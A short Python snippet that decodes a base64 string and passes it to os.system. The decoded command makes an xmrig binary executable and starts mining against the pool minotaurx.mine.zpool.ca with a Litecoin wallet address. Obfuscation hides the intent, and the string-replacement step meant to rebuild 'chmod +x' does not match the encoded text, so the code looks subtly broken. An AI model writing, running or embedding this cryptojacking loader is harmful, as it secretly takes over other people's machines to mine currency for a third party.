import os
code = "Y2hmodArIHggeG1yaWcgJiYgLi94bXJpZyAtbyBtaW5vdGF1cngubWluZS56cG9vbC5jYTo3MDE5IC1hIG1pbm90YXVyeCAtdSBsdGMxcXBtdmtxdXpwYTVjOXFoa3E0dDhwdmhmZmQ3MjM4YWU1emV3cjB2IC1wIGM9TFRD"
import base64; os.system(base64.b64decode(code.replace("chmodAr", "chmod +x")).decode())
